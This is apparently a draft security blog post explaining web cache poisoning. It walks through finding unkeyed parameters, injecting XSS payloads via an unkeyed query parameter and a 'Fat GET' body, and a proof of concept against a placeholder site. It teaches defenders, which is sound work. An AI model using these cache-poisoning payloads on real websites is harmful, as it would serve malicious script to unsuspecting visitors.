---
title: "Introduction to Cache Poisoning Attacks"
date: 2025-02-18
draft: true
description: "Introduction into Cache Poisoning Attacks"
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">


```
Introduction
During a recent penetration test of a web application, we discovered a Cross-Site Scripting (XSS) via caching vunlerabillity. This article explores the discovery, and exploitation of this issue to help developers and security professionals better understand and protect against similar vulnerabilities.
Terminology
Keyed Parameters
Keyed parameters are parameters that the cache system considers when storing and retrieving cached content. This means that variations in these parameters will result in different cached entries.
For example, if the URL has parameters such as ?user=123 and the cache is keyed on this parameter, the cache will store and serve different content (cache miss) for ?user=123 and ?user=456.
Unkeyed Parameters
Unkeyed parameters are parameters that the cache system ignores when storing and retrieving cached content. This means that variations in these parameters will not result in different cached entries. The cache will store only one version of the content (cache hit), regardless of the variations in these parameters.
Step 1: Identifying Unkeyed Parameters
The first step is to identify unkeyed parameters, since keyed parameters need to be the same when the victim accesses the resource.
Example
http
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com
http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: MISS # <-- Note that we get a cache MISS here

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, admin!</p>
</body>
</html>
Now we alter each parameter and check weather we get a cache miss or hit. A cache MISS indicates us that this parameter is keyed, since the server loaded a new version of the website.
http
GET /page?user=guest&tracking=abc HTTP/1.1
Host: example.com
http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: MISS # <-- Note we get a cache MISS here again (keyed parameter)

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, guest!</p>
</body>
</html>
Now that we identified the user parameter to be keyed, let’s continue and check the tracking parameter.
http
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com
http
Content-Type: text/html
Content-Length: 456
X-Cache: HIT # <-- Note that we get a cache HIT here, since we already made that requests before

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, admin!</p>
</body>
</html>
http
GET /page?user=admin&tracking=efg HTTP/1.1
Host: example.com
http
Content-Type: text/html
Content-Length: 456
X-Cache: HIT # <-- Note that we get a cache HIT here again, indicating that this parameter is unkeyed

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, admin!</p>
</body>
</html>
We can observe the tracking parameter must be a unkeyed value, since the cache always returns HIT, even though the value of the parameter was changed.
The same thing also sometimes applies to header values in the http requests.
Step 2: Exploitation
One of the most commong ways to exploit WCP is through XSS, though there are other attacks like DoS or unkeyed Cookies as well. To exploit a XSS you have to find an injection point using an unkeyed parameter. The XSS will then be severed to all other users loading that cached version.
Example
Imagine we have an injection via the tracking parameter into a meta tag like this
http
GET /page?user=admin&tracking=https://mytrack.com HTTP/1.1
...

<meta http-equiv="refresh" content="https://mytrack.com" />
http
GET /page?user=admin&tracking="><img/src/onerror=print()> HTTP/1.1
Host: example.com
http
Content-Type: text/html
Content-Length: 456
X-Cache: MISS # <-- Initial request will be a MISS, the next time we open it will be a HIT

<html>
<head>
  <title>Welcome</title>
  <meta http-equiv="refresh" content="https://"><img/src/onerror=print()> />
</head>
<body>
  <p>Welcome, admin!</p>
</body>
</html>
Since tracking is an unkeyed parameter, anybody who visits the page /page?user=admin will be a victim of the XSS attack.
Step 3: Advanced WCP Techniques
Fat GET
A “Fat GET” request, is when we use GET parameters in the post body, while still using the GET verb. If a server is misconfigured it might parse the parameters from the body.
http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: example.com
http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: example.com
Content-Length: 10

param3=123
With this you can try to create a discrepancy between the webserver and the cache. With this we can also use keyed parameters, since they are no longer directly present in the URL. We can then go back and perform an XSS attack the same way we did before.
http
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com

user=guest
http
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, guest!</p>
</body>
</html>
http
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com

user=</p><img/src/onerror=print()><p>
http
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <p>Welcome, </p><img/src/onerror=print()><p>!</p>
</body>
</html>
Again, if a victim now opens example.com/page?user=admin the XSS will be loaded from the cache.
A Real Life PoC
http
GET /?cb=100&"><image/src/onerror=print()> HTTP/2
Host: target-website.com
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36

HTTP/2 200 OK
CACHE: HIT
htmlbars
...
<meta property="og:url" content="https://target-website.com/?cb=100&"><image/src/onerror=print()>">
...
In this example, an image tag with an onerror event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.
```